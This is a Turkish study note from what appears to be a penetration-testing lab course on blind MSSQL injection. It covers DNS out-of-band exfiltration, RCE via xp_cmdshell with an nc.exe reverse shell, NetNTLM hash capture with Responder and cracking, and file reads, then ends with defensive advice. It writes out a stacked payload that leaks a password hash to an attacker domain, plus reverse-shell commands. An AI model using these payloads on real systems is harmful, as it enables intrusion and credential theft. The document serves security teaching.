Bu iki tablodan bizim için daha ilginç olanı flag tablosudur. Verileri dökmeye başlayabilmek için hangi sütunlara sahip olduğunu bulalım. Bunu yapmak için kullanacağımız sorgular bir öncekine çok benzeyecektir.

![Pasted image 20241213200419.png](/img/user/resimler/Pasted%20image%2020241213200419.png)

Yukarıdaki for döngüsünü kopyalayabilir ve sütun adlarını dökmek için sorguları yukarıda açıklananlarla güncelleyebiliriz:

![Pasted image 20241213200443.png](/img/user/resimler/Pasted%20image%2020241213200443.png)

Ve çıktıdan, flag tablosundaki tek sütunun adını buluyoruz.

![Pasted image 20241213200457.png](/img/user/resimler/Pasted%20image%2020241213200457.png)

Bu noktada biliyoruz:

* Digcraft veritabanındayız
* There are 2 tables:
	* flag 
	* userAgents 
* flag tablosunda 1 sütun vardır:
	* flag 

### Daha Fazla Numaralandırma

Bu tablolardaki tüm değerleri dump etmek için bu bölümdeki tekniği kullanmaya devam edebiliriz. Bu bölümün interaktif kısmı için, flag'deki satır sayısını bulmak, değerleri (flag sütununun) dökmek ve ardından değeri cevap olarak göndermek için kodu uyarlamanız gerekecektir.



### Out-of-Band DNS

### Theory

Koşullar izin verirse, DNS exfiltration kullanabiliriz . Bu yöntemde hedef sunucunun kontrol ettiğimiz bir sunucuya subdomain olarak veri (kodlanmış) içeren bir DNS isteği göndermesini sağlarız. Örneğin, evil.com'u kontrol ediyorsak, hedef sunucunun 736563726574.evil.com adresine bir DNS isteği göndermesini sağlayabilir ve ardından günlükleri kontrol edebiliriz. Bu örnekte, 736563726574 olarak hex kodlu secret değerini çıkardık.

DNS exfiltration, zaman tabanlı SQL enjeksiyonlarına özgü değildir; ancak, bu durumda daha faydalı olabilir çünkü zaman tabanlı enjeksiyonlar, boolean tabanlı enjeksiyonlara göre çok daha uzun sürer, her zaman doğru sonuç vermez ve bazen tamamen imkânsız olabilir. Kör (blind) enjeksiyon açıklıklarını kaçırmamak için metodolojinizde DNS exfiltration testlerini dahil etmek her zaman iyi bir fikirdir. Örneğin, hiçbir şey döndürülmezse ve sorgu senkronize bir şekilde çalıştırılırsa, yanıt süresinde herhangi bir gecikme olmayabilir ve bu da açıklığın fark edilmemesine neden olabilir.


### Techniques

Belirli teknikler farklı SQL dilleri için değişiklik gösterir, özellikle MSSQL'de burada bazı yollar vardır. Hepsi farklı izinler gerektirir, bu nedenle her durumda çalışmayabilir. Tüm bu payloadlarda, SELECT 1234 sızmak istediğiniz bilgi için bir placeholder'dır. Digcraft Hosting örneğimizde, flag hedeflemek istediğimiz şeydir. YOUR.DOMAIN, kontrol ettiğiniz bir domain ile değiştirilmelidir, böylece sızan verileri DNS günlüklerinden okuyabilirsiniz. Bunu bölümün ilerleyen kısımlarında daha ayrıntılı olarak ele alacağız.

![Pasted image 20241213202340.png](/img/user/resimler/Pasted%20image%2020241213202340.png)
![Pasted image 20241213202347.png](/img/user/resimler/Pasted%20image%2020241213202347.png)

Not: Yukarıdaki tüm payload'larda @T'yi VARCHAR olarak bildirerek başladığımıza, ardından sorgumuzu içine eklediğimize ve ardından domain'e eklediğimize dikkat edin. Bu, daha sonra @T'yi birden fazla stringe bölmek istediğimizde kullanışlı olacaktır, böylece bir sub domain olarak sığacaktır. Ayrıca, elde ettiğimiz sonucun bir string olduğundan emin olmak için de kullanışlıdır, aksi takdirde sorgumuzu bozabilir.


### Limitations

Domain adlarında kullanılabilecek karakterler (temel olarak) sayılar ve harflerle sınırlıdır. Buna ek olarak, etiketler (noktalar arasındaki kısım) en fazla 63 karakter uzunluğunda olabilir ve tüm domain en fazla 253 karakter uzunluğunda olabilir. Bu sınırlamalarla başa çıkmak için, verileri birden fazla sızma isteğine bölmek ve örneğin verileri hex veya base64 olarak kodlamak gerekebilir.

Bu sınırlamayı aşmak için, @T içinde tanımlanan sorgunun sonucunun kodlanmasını ve 63 karakterden daha kısa 2 stringe bölünmesini sağlamak için yukarıdaki payloadların başındaki @T bildirimini aşağıdaki sorgu ile değiştirebiliriz:

![Pasted image 20241213202542.png](/img/user/resimler/Pasted%20image%2020241213202542.png)

Payload temel olarak @T , @A ve @B değişkenlerini bildiren bir SQL sorgusu kullanır, ardından flag tablosundan flag'ı @T'ye seçer, sonucu @A ve @B'ye böler ve son olarak @A URL'sine erişmeye çalışır. @B . OUR_URL URL'sine erişmeye çalışır ki bunu DNS geçmişimiz üzerinden okuyabiliriz.

Son bir payload örneği aşağıdaki gibi görünecektir:

![Pasted image 20241213202618.png](/img/user/resimler/Pasted%20image%2020241213202618.png)



### Interact.sh

Interactsh ( Github), DNS istekleri de dahil olmak üzere OOB etkileşimlerini tespit etmek için kullanabileceğiniz açık kaynaklı bir araçtır. Hem Linux hem de Windows üzerinde çalışır.

Tarayıcı içi sürümü https://app.interactsh.com adresini ziyaret ederek kullanabilirsiniz. Yüklenmesi birkaç saniye sürebilir, ancak hazır olduğunda panonuza kopyalayabileceğiniz bir domain olacaktır.

![Pasted image 20241213202729.png](/img/user/resimler/Pasted%20image%2020241213202729.png)

Örnek olarak, aşağıdaki payload'u (yukarıdaki listeden) UserAgent güvenlik açığına girebiliriz, bu da bayrağı (hex-encoded) yalnızca bir istekte dışarı çıkaracaktır!

![Pasted image 20241213202757.png](/img/user/resimler/Pasted%20image%2020241213202757.png)

Payload'u gönderdikten sonra, web uygulamasında bir avuç DNS isteği görünmelidir. En sonuncusuna tıklamak daha fazla ayrıntı ve bu durumda sızdığımız (hex kodlu) bayrağı gösterecektir!

![Pasted image 20241213202820.png](/img/user/resimler/Pasted%20image%2020241213202820.png)

Alternatif olarak, GitHub sürümleri sayfasından indirebileceğiniz bir komut satırı varyantı vardır. İşte aynı payload'un bir örneği (Linux üzerinde çalışan).

![Pasted image 20241213202854.png](/img/user/resimler/Pasted%20image%2020241213202854.png)
![Pasted image 20241213202858.png](/img/user/resimler/Pasted%20image%2020241213202858.png)



### Burp Collaborator

Burpsuite Professional, Burp Collaborator adında built-in bir OOB interactions client'a sahiptir. Hem Linux hem de Windows üzerinde de çalışır ancak elbette ücretlidir. Client'ı Burp > Burp Collaborator Client menüsünden başlatabilirsiniz.

![Pasted image 20241213203016.png](/img/user/resimler/Pasted%20image%2020241213203016.png)

Client başlatıldıktan sonra, vurgulanan buton ile domaininizi panoya kopyalayabilirsiniz.

![Pasted image 20241213203038.png](/img/user/resimler/Pasted%20image%2020241213203038.png)

Göstermek için, flag'i exfiltrate etmek için biraz değiştirilmiş yukarıdaki payload ile oluşturulan domain'i kullandık. Burp Collaborator @[email protected] yapmamıza izin vermez, bu nedenle bu payload bunun yerine iki istek gönderir ( @A.xxx.burpcollaborator.net ve @B.xxx.burpcollaborator.net ).

![Pasted image 20241213203118.png](/img/user/resimler/Pasted%20image%2020241213203118.png)

Biraz daha uzun sürse de işe yarıyor:

![Pasted image 20241213203133.png](/img/user/resimler/Pasted%20image%2020241213203133.png)

Not: Out-of-Band DNS exfiltrasyonu SQL enjeksiyonlarına özgü değildir, aynı zamanda kör XXE (eXternal XML Entities) veya blind command injection gibi veri veya komut çıktısı almak için diğer blind saldırılarla birlikte de kullanılabilir


### Özel DNS Kaydı Kullanma

Interact.sh ve Burp Collaborator ile yapılan yukarıdaki iki örnek, bu iki sunucu tarafından sağlanan DNS/domain loglama hizmetleri kullanılarak bu saldırının internet üzerinden nasıl gerçekleştirilebileceğini göstermiştir.  DNS Out-of-band data exfiltration, herhangi bir kuruluşun local ağını pentest ederken de mümkündür ve kuruluşun lokal DNS sunucusuna erişimimiz varsa internete çıkmadan lokal olarak gerçekleştirilebilir. Ayrıca, aşağıda göstereceğimiz gibi, herhangi bir İSS veya DNS yetkilisi ile özel bir DNS kaydı oluşturarak Interact.sh ve Burp Collaborator'a güvenmeden saldırıyı internet üzerinden de gerçekleştirebiliriz.

Aşağıdaki sanal makine, yeni domain adları eklememize izin veren bir DNS sunucu kurulumuna sahiptir ve bu da gerçek hayatta yeni DNS kayıtları/domainleri eklemek için kullanacağımız bir DNS yetkilisini simüle eder.

Kontrol paneline 5380 numaralı porttan erişebilir ve varsayılan kimlik bilgileriyle (admin: admin) giriş yapabilir ve ardından Zones'a ve ardından Add Zone'a tıklayabiliriz. Ardından, istekleri almak istediğimiz herhangi bir benzersiz domain adını girebiliriz, bu durumda blindsqli.academy.htb kullanacağız ve bunu Primary Zone olarak seçeceğiz:

![Pasted image 20241213203512.png](/img/user/resimler/Pasted%20image%2020241213203512.png)

Ardından, istekleri saldırı makinemizin IP'sine yönlendiren bir A kaydı ekleyebiliriz. Adı @ olarak tutabilir (herhangi bir sub-domain/record ile eşleşmesi için joker karakter), A tipini (IPv4 DNS kaydı) seçebilir ve makinemizin IP adresini ayarlayabiliriz:

![Pasted image 20241213203550.png](/img/user/resimler/Pasted%20image%2020241213203550.png)

Özel bir DNS domain kullandığımız ve DNS sunucu günlüklerine erişimimiz olduğu için, günlükleri yakalamak için interact.sh gibi başka bir listener kurmamıza gerek yoktur (yine de bir seçenektir) ve bunun yerine DNS web uygulamasındaki DNS loglarını doğrudan izleyebilir ve gelen DNS istekleri arasında arama yapabiliriz.


### Practical Example

Daha önce gösterildiği gibi bir DNS OOB saldırısı deneyelim ve nasıl veri sızdırabileceğimizi görelim. Bu sefer saldırıyı diğer ( Aunt Maria's Donuts ) web uygulaması üzerinde gerçekleştireceğiz, böylece farklı bir örnek gösterebiliriz. Daha önce bahsedilen payloadlardan birini aşağıdaki gibi enjekte edeceğiz:

![Pasted image 20241213203845.png](/img/user/resimler/Pasted%20image%2020241213203845.png)

İlk olarak, saldırıların beklendiği gibi çalıştığından emin olmak için bir test saldırısı gerçekleştirelim, çünkü bu herhangi bir blind saldırısı gerçekleştirirken önemli bir adımdır, çünkü potansiyel sorunları daha sonra tespit etmek daha zordur. Boolean SQL Injection saldırısı yapmakla ilgilenmediğimiz için, bu sefer AND kullanmayacağız ve yukarıdaki sorgumuza sadece bir maria'; :

![Pasted image 20241213203912.png](/img/user/resimler/Pasted%20image%2020241213203912.png)

Yukarıdaki sorguyu gönderdikten sonra, sorgunun doğru çalıştığını onaylayan bir mesaj almalıyız:

![Pasted image 20241213203928.png](/img/user/resimler/Pasted%20image%2020241213203928.png)

Şimdi, 1234 sub domain'i ile bir DNS isteği gönderildiğini doğrulamak için DNS loglarını kontrol etmemiz gerekiyor. Bunu yapmak için DNS sunucusundaki Logs sekmesine gideceğiz, ardından Query Logs'a ve son olarak Query'ye basacağız. Gördüğümüz gibi, yukarıdaki verilerle gerçekten de birkaç isabet aldık:

![Pasted image 20241213204017.png](/img/user/resimler/Pasted%20image%2020241213204017.png)

(SELECT 1234) yerine, maria'nın parola hash'ini yakalamak istiyoruz. Bu nedenle, @T içinde tanımlanan sorguyu aşağıdakiyle değiştireceğiz:

![Pasted image 20241213204041.png](/img/user/resimler/Pasted%20image%2020241213204041.png)

Not: Seçtiğimiz sorgunun her zaman yalnızca 1 sonuç döndürdüğünden emin olmalıyız, aksi takdirde saldırımız doğru çalışmayabilir ve tüm sonuçları tek bir string halinde birleştirmemiz gerekebilir.

Elbette, DNS kurallarına uymayan ve saldırımızı bozacak ASCII olmayan karakterler içerebileceğinden, sonucu kodlamamız gerekir. Bu yüzden, @T bildirimini aşağıdaki ile değiştiriyoruz (daha önce gösterildiği gibi):

![Pasted image 20241213204125.png](/img/user/resimler/Pasted%20image%2020241213204125.png)

Şimdi, domain'deki @T'yi @A ve @B ile değiştirirken her iki sorguyu da yığınlayabiliriz ve nihai enjeksiyon payload'umuz aşağıdaki gibi görünecektir:

`maria';DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) from users WHERE username='maria'; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.blindsqli.academy.htb\x.trc',DEFAULT);- -+-`


Sorguyu çalıştırıyoruz ve doğru şekilde yürütüldüğünü onaylıyoruz:

![Pasted image 20241213204232.png](/img/user/resimler/Pasted%20image%2020241213204232.png)

Son olarak, DNS kayıtlarını tekrar kontrol ediyoruz ve gerçekten de kodlanmış sonucumuzu buluyoruz:

![Pasted image 20241213204248.png](/img/user/resimler/Pasted%20image%2020241213204248.png)

Şimdi tek yapmamız gereken bu değerleri ASCII hex kodundan çözmektir (sub-domain'leri ayıran . işaretini kaldırdıktan sonra):

![Pasted image 20241213204324.png](/img/user/resimler/Pasted%20image%2020241213204324.png)

Zorluk: Sonuçları birden fazla istek üzerinden gerektiği kadar küçük subdomainlere otomatik olarak bölerek tüm bu süreci otomatikleştirmek için önceki komut dosyalarımızı uyarlamaya çalışın.


### Remote Code Execution

### Scenario

Eğer sa kullanıcısı olarak bir SQL enjeksiyonu yaparsak ya da kullanıcımız gerekli izinlere sahipse, MSSQL'in bizim için keyfi komutlar çalıştırmasını sağlayabiliriz. Bu bölümde, reverse shell elde etmek için bir kez daha Aunt Maria's Donuts örneğini kullanacağız.

### İzinleri Doğrulama

Her şeyden önce, xp_cmdshell kullanıp kullanamayacağımızı doğrulamak istiyoruz. Aşağıdaki sorgu ile sa olarak çalışıp çalışmadığımızı kontrol edebiliriz:

![Pasted image 20241213204558.png](/img/user/resimler/Pasted%20image%2020241213204558.png)

Sorgu, sunucuya kullanıcımızın sysadmin rolüne sahip olup olmadığını sorar, evet ise 1, aksi takdirde 0 döndürür. Aunt Maria's Donuts örneğinde aşağıdaki payload'u kullanabiliriz:

![Pasted image 20241213204620.png](/img/user/resimler/Pasted%20image%2020241213204620.png)

Bu, sysadmin rolüne sahip olduğumuzu gösteren alınmış bir durumla sonuçlanmalıdır

![Pasted image 20241213204645.png](/img/user/resimler/Pasted%20image%2020241213204645.png)



### xp_cmdshell'i Etkinleştirme

Komutları yürütmemizi sağlayan prosedür xp_cmdshell'dir. Varsayılan olarak, bir proxy hesabı ayarlanmadığı sürece komutları nt service\mssqlserver olarak çalıştırır.

Komutları yürütmemizi sağlayan prosedür xp_cmdshell'dir. Varsayılan olarak, bir proxy hesabı ayarlanmadığı sürece komutları nt service\mssqlserver olarak çalıştırır.

![Pasted image 20241213205047.png](/img/user/resimler/Pasted%20image%2020241213205047.png)

Aunt Maria's Donuts örneğinde, payload şu şekilde görünecektir:

![Pasted image 20241213205105.png](/img/user/resimler/Pasted%20image%2020241213205105.png)

URL-Encode, inject ve doğru çalıştıysa sunucudan normal bir yanıt almalıyız:

![Pasted image 20241213205126.png](/img/user/resimler/Pasted%20image%2020241213205126.png)

Ardından, xp_cmdshell'i etkinleştireceğiz (bu gelişmiş bir seçenektir, bu nedenle önce bu önceki sorguyu çalıştırdığınızdan emin olun). Komutlar şunlardır:

![Pasted image 20241213205143.png](/img/user/resimler/Pasted%20image%2020241213205143.png)

Payload (URL-Kodlamadan önce) şöyledir:

![Pasted image 20241213205158.png](/img/user/resimler/Pasted%20image%2020241213205158.png)

Ve bir kez daha başarılı bir enjeksiyon düzenli bir yanıt vermelidir:

![Pasted image 20241213205216.png](/img/user/resimler/Pasted%20image%2020241213205216.png)

Bu noktada, xp_cmdshell etkinleştirilmelidir, ancak sadece kendimize birkaç kez ping atabileceğimizden emin olmak için. Bunu yapmak için komut şuna benzer:

![Pasted image 20241213205333.png](/img/user/resimler/Pasted%20image%2020241213205333.png)

Ve bunun gibi bir payload olarak

![Pasted image 20241213205349.png](/img/user/resimler/Pasted%20image%2020241213205349.png)

Payload'u çalıştırmadan önce tcpdump'ı doğru arayüzde “(Pwnbox için tun0 olacaktır)” başlattığınızdan emin olun ve 4 çift ICMP istek/cevap paketi görmelisiniz:

![Pasted image 20241213205408.png](/img/user/resimler/Pasted%20image%2020241213205408.png)

Web sitesi bir kez daha düzenli bir yanıt vermelidir.


### Reverse Shell

Bu noktada, SQLi'mizi başarılı bir şekilde RCE'ye dönüştürdük. Şimdi de uygun bir reverse shell ile bitirelim. Bunu yapmanın birçok yolu vardır; bu durumda, bir bağlantı üzerinde cmd.exe çalıştırmak için bir Windows netcat binary kullanmayı seçtik.

Sunucunun çalıştırmasını istediğimiz (powershell) komutu şu şekildedir. İlk olarak saldırgan makinemizden nc.exe dosyasını indiriyoruz ve ardından saldırgan makinemizdeki 9999 numaralı porta bağlanıp cmd.exe dosyasını çalıştırıyoruz.

![Pasted image 20241213205523.png](/img/user/resimler/Pasted%20image%2020241213205523.png)
![Pasted image 20241213205529.png](/img/user/resimler/Pasted%20image%2020241213205529.png)

Tırnak işaretleriyle uğraşmamak için PowerShell payload'larını kodlamak tercih edilir. Bunu yapmak için kullanışlı bir araç Raikia's Hub'dır, ancak zaman zaman çevrimdışı olduğu bilinmektedir. Sızma testi uzmanları olarak, bu tür görevleri herhangi bir harici araca güvenmeden nasıl gerçekleştireceğimizi bilmek önemlidir. Payload'u kodlamak için önce UTF-16LE'ye (16-bit Unicode Transformation Format Little-Endian) dönüştürmemiz ve ardından Base64-encode etmemiz gerekir. PAYLOAD'u gerçek PowerShell payload'u ile değiştirerek payload'u kodlamak için aşağıdaki Python3 one-liner'ını kullanabiliriz:

![Pasted image 20241213205624.png](/img/user/resimler/Pasted%20image%2020241213205624.png)

![Pasted image 20241213205632.png](/img/user/resimler/Pasted%20image%2020241213205632.png)

Kodlanmış payload ile, -enc ( kodlanmış ) bayrağı ile birlikte Execution Policy'yi bypass olarak ayarlayarak powershell'e aktarmamız gerekir. Sunucunun çalıştırmasını isteyeceğimiz komut şu şekilde olur:

![Pasted image 20241213205651.png](/img/user/resimler/Pasted%20image%2020241213205651.png)

Komutu çalıştırmadan önce, sunucunun indirmesi için makinemize nc.exe dosyasını indirip barındırmamız gerekiyor. Derlenmiş bir versiyonunu [buradan](https://github.com/int0x33/nc.exe) indirebilirsiniz. Herhangi bir dizine koyun ve ardından aşağıdaki gibi Python ile 80 numaralı portta geçici bir HTTP sunucusu başlatın:

![Pasted image 20241213205724.png](/img/user/resimler/Pasted%20image%2020241213205724.png)

HTTP sunucusu dinlemeye başladığında, nc -nvlp 9999 ile bir netcat dinleyicisi başlatın ve payload'u enjekte edin! Bir reverse ( cmd ) shell elde etmeliyiz.

![Pasted image 20241213205748.png](/img/user/resimler/Pasted%20image%2020241213205748.png)

Not: Eğer powershell kullanmayı tercih ederseniz, elbette cmd nc.exe -nv 192.168.43.164 9999 -e C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe gibi bir komut kullanarak `cmd.exe` yerine `nc.exe`nin çalıştırmasını sağlayabilirsiniz.


### NetNTLM Hash'lerinin Sızdırılması

### Hash'i Yakalamak

Veritabanı yöneticilerinin MSSQL'in ağ paylaşımlarına erişebilmesi için hizmet hesapları oluşturması alışılmadık bir durum değildir. Durum buysa ve bir SQL enjeksiyonu bulduysak, NetNTLM kimlik bilgilerini yakalayabilmeli ve muhtemelen bunları kırabilmeliyiz

Temel olarak, SQL sunucusunu kontrol ettiğimiz bir SMB paylaşımına erişmeye ve kimlik bilgilerini yakalamaya zorlayacağız. Bunu yapmanın birkaç yolu var, bunlardan biri Responder kullanmak. GitHub deposunu local olarak klonlayalım ve klasöre girelim.

![Pasted image 20241213205902.png](/img/user/resimler/Pasted%20image%2020241213205902.png)

Ardından, VPN ağ arayüzünde Responder'ı dinlemeye başlayın. SMB sunucusunun [ON] yazdığından emin olun. Eğer yazmıyorsa, aynı dizindeki Responder.conf dosyasını değiştirin ve SMB = Off satırını SMB = On olarak değiştirin.

![Pasted image 20241213205924.png](/img/user/resimler/Pasted%20image%2020241213205924.png)

Responder hazır ve çalışır durumdayken SQL payload'u üzerinde çalışabiliriz. Çalıştırmak istediğimiz sorgu şudur:

![Pasted image 20241213205945.png](/img/user/resimler/Pasted%20image%2020241213205945.png)

Bu, kimlik doğrulama (NetNTLM hash'ini gönderme) gerektiren myshare SMB paylaşımının içeriğini listelemeye çalışacaktır.

![Pasted image 20241213210123.png](/img/user/resimler/Pasted%20image%2020241213210123.png)

Payload'u api/check-username.php'ye karşı çalıştırmak sunucudan normal bir yanıt döndürmelidir.

![Pasted image 20241213210140.png](/img/user/resimler/Pasted%20image%2020241213210140.png)

Ancak Responder'ı kontrol edersek, şimdi SQL01\jason'dan bir NetNTLM hash'i görmeliyiz

![Pasted image 20241213210158.png](/img/user/resimler/Pasted%20image%2020241213210158.png)



### Extra: Cracking the Hash

Eğer kullanıcı (hashini yakaladığımız) zayıf bir şifre kullanıyorsa, bunu kırabiliriz. Hashcat'i 5600 modu ile şu şekilde kullanabiliriz:

![Pasted image 20241213210225.png](/img/user/resimler/Pasted%20image%2020241213210225.png)

Bu durumda, yakaladığımız hash'i girebilir ve şifreyi kırmak için kelime listesi olarak rockyou.txt'yi kullanabiliriz:

![Pasted image 20241213210319.png](/img/user/resimler/Pasted%20image%2020241213210319.png)


### File Read

### Theory

Eğer doğru izinlere sahipsek, dosyaları bir (MS)SQL enjeksiyonu aracılığıyla okuyabiliriz. Bunu yapmak için [OPENROWSET](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver16) fonksiyonunu toplu bir işlemle kullanabiliriz.

![Pasted image 20241213210424.png](/img/user/resimler/Pasted%20image%2020241213210424.png)

syntax şu şekildedir. SINGLE_CLOB girdinin varchar olarak saklanacağı anlamına gelir, diğer seçenekler verileri varbinary olarak saklayan SINGLE_BLOB ve nvarchar kullanan SINGLE_NCLOB'dur.

![Pasted image 20241213210448.png](/img/user/resimler/Pasted%20image%2020241213210448.png)


### Checking Permissions

Tüm kullanıcılar OPENROWSET'i kullanabilir, ancak BULK işlemlerini kullanmak özel ayrıcalıklar gerektirir, özellikle de ADMINISTER BULK OPERATIONS veya ADMINISTER DATABASE BULK OPERATIONS . Kullanıcımızın bunlara sahip olup olmadığını aşağıdaki sorgu ile kontrol edebiliriz

![Pasted image 20241213210514.png](/img/user/resimler/Pasted%20image%2020241213210514.png)

Bu bölümde pratik yapmak için yine Aunt Maria's Donuts'ı kullanacağız. Yukarıdaki sorguyu şu şekilde çalıştırabiliriz:

![Pasted image 20241213210531.png](/img/user/resimler/Pasted%20image%2020241213210531.png)
![Pasted image 20241213210534.png](/img/user/resimler/Pasted%20image%2020241213210534.png)

Sunucudan aşağıdaki yanıtı döndürmelidir:

![Pasted image 20241213210549.png](/img/user/resimler/Pasted%20image%2020241213210549.png)


### Boolean-based okuma

Gerekli izinlere sahip olduğumuzu doğruladıktan sonra, oracle'a gönderilen sorguları değiştirerek dosya içeriğini dışarı dökmek için bu bölümde yazdığımız scripti uyarlayabiliriz.

![Pasted image 20241213210632.png](/img/user/resimler/Pasted%20image%2020241213210632.png)

Bu script'in çalıştırılması hedef dosyanın dump edilmesiyle sonuçlanmalıdır. Tabii ki, bunun çalışması biraz zaman alabilir.

![Pasted image 20241213210651.png](/img/user/resimler/Pasted%20image%2020241213210651.png)


### Tools of the Trade

### SQLMap

#### Example: Aunt Maria's Donuts

SQLMap'in gücünü göstermek için, Aunt Maria's Donuts'a boolean-blind SQLi saldırısını yeniden yapacağız. İlk olarak, SQLMap'i SQL enjeksiyonuna karşı savunmasız olduğundan şüphelendiğimiz / bildiğimiz api/check-username.php endpoint'ine karşı çalıştıracağız.

![Pasted image 20241213210802.png](/img/user/resimler/Pasted%20image%2020241213210802.png)
![Pasted image 20241213210808.png](/img/user/resimler/Pasted%20image%2020241213210808.png)

Kısa bir süre sonra SQLMap, boolean tabanlı bir SQLi açığını başarıyla tespit ettiğini yazdıracak ve bize kullandığı payload'u verecektir. Doğrulanan bir enjeksiyon noktası ile --dbs bayrağını ekleyerek tüm veritabanlarını listelemeye geçebiliriz.

![Pasted image 20241213210838.png](/img/user/resimler/Pasted%20image%2020241213210838.png)
![Pasted image 20241213210842.png](/img/user/resimler/Pasted%20image%2020241213210842.png)

Yukarıdaki çıktıda sunucuda beş veritabanı olduğunu görebiliriz. Bunların arasında amdonuts bizim için en ilginç olanı. Aşağıdaki komutla bu veritabanını seçebilir ve tabloları listeleyebiliriz.

![Pasted image 20241213210909.png](/img/user/resimler/Pasted%20image%2020241213210909.png)

Bu durumda, users veritabanındaki tek tablodur. Bunu aşağıdaki komutla dump edebiliriz. Bu sefer -batch bayrağını hariç tuttuğumuza dikkat edin. Bunun nedeni SQLMap'in varsayılan olarak hash'leri kırmaya çalışacak olmasıdır, ki ben bunu yapmakla ilgilenmiyorum.

![Pasted image 20241213210943.png](/img/user/resimler/Pasted%20image%2020241213210943.png)
![Pasted image 20241213210954.png](/img/user/resimler/Pasted%20image%2020241213210954.png)


### SQL Enjeksiyonu Güvenlik Açıklarını Önleme

### Input Validation / Sanitization

SQL enjeksiyonu, geliştiricilerin düzgün bir şekilde sterilize edilmemiş kullanıcı girdisi kullanarak dinamik sorgular oluşturması nedeniyle gerçekleşir. Siz (bir geliştirici olarak) her zaman kullanıcı girdisini sterilize etmeli ve belirli bir formla (örn. e-posta) eşleşmesi bekleniyorsa doğrulamalısınız. En iyi zihniyet, tüm kullanıcı girdilerine tehlikeliymiş gibi davranmaktır.

### Parametrelendirilmiş Sorgular

Parametrelendirilmiş sorgular kullanmak SQLi güvenlik açıklarından kaçınmak için çok iyi bir yoldur, çünkü sorguyu ve değişkenleri ayrı ayrı iletirsiniz ve sunucunun kullanıcı girdisinden bağımsız olarak neyin kod neyin veri olduğunu anlamasını sağlarsınız.

Burada, kullanıcı girdisini sorguda birleştiren savunmasız bir SQL sorgusu örneği yer almaktadır.

![Pasted image 20241213211117.png](/img/user/resimler/Pasted%20image%2020241213211117.png)

Aynı sorgu parametrelendirilmiş olsaydı bu şekilde görünürdü. Bu küçük bir değişikliktir, ancak savunmasız ve güvenli kod arasındaki farktır.

![Pasted image 20241213211131.png](/img/user/resimler/Pasted%20image%2020241213211131.png)

Not: Tüm bunlardan sonra bile, db'de depolanan tüm kullanıcı verilerine tamamen güvenmemeliyiz, çünkü her zaman bir şeyleri gözden kaçırabiliriz ve kullanıcı db'de kötü amaçlı bir şey depolayabilir. Bu nedenle, özellikle kullanıcı tarafından oluşturulan verilerin çıktısı alınırken, veri çıktısı üzerinde sanitizasyon / filtreleme uygulanması da önerilir. Bu şekilde, veri girişi yerine veri çıktısı üzerinde çalışan 2. seviye SQL saldırılarını önlemiş oluruz.


### MSSQL'e Özel Önlemler

Özellikle MSSQL ile ilgili olarak, MSSQL'e özgü saldırıları önlemek için yapmak isteyebileceğiniz birkaç şey vardır


### Sorguları Sysadmin Olarak Çalıştırmayın!

İlk ve en önemlisi, sorgularınızı çalıştırmak için [sa](https://www.paloaltonetworks.com/cyberpedia/what-is-the-principle-of-least-privilege) kullanmayın. Daha somut olarak, mümkün olduğunca az ayrıcalığa sahip bir hesap kullanın. Herhangi bir ekstra ayrıcalık, bir SQL enjeksiyonunu tanımlayan saldırganlar tarafından istismar edilebilir ve edilecektir.

Bu grafik ([kaynak](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver16)) MSSQL'deki yerleşik built-in rollerini vurgular. Public rolü varsayılan roldür ve diğer tüm roller ekstra rollerdir (db_denydatareader ve db_denydatawriter rolleri aslında ayrıcalıkları ortadan kaldırsa da).

![Pasted image 20241213211338.png](/img/user/resimler/Pasted%20image%2020241213211338.png)


### Disable Dangerous Functions

İhtiyacı olmayan kullanıcılar için tehlikeli işlevleri devre dışı bırakmak isteyebilirsiniz. Örneğin, saldırganlar NetNTLM hash'lerini sızdırmak için xp_dirtree'yi kullanabilir ve web sitenizin bu fonksiyonu kullanmaması muhtemeldir, bu nedenle web sitenizin veritabanını sorgulamak için kullandığı belirli bir kullanıcı için devre dışı bırakmak isteyebilirsiniz.

Örneğin, public rolüne sahip tüm kullanıcıların xp_dirtree üzerindeki yürütme ayrıcalıklarını iptal etmek için şu komutu çalıştırırız:

![Pasted image 20241213211447.png](/img/user/resimler/Pasted%20image%2020241213211447.png)

Not: xp_dirtree gibi fonksiyonları tamamen devre dışı bırakmak mümkündür, ancak sunucunun kendisi bu fonksiyonu kullandığı için bu yapmak isteyeceğiniz bir şey değildir.


### Skill Assessment
Doner 4 You tarafından web sitelerini herhangi bir güvenlik açığına karşı test etmeniz için işe alındınız. Onlara teknoloji stack'lerinin ne olduğunu soruyorsunuz ve HTML + CSS diyorlar; yasal görünüyor

![Pasted image 20241213211553.png](/img/user/resimler/Pasted%20image%2020241213211553.png)
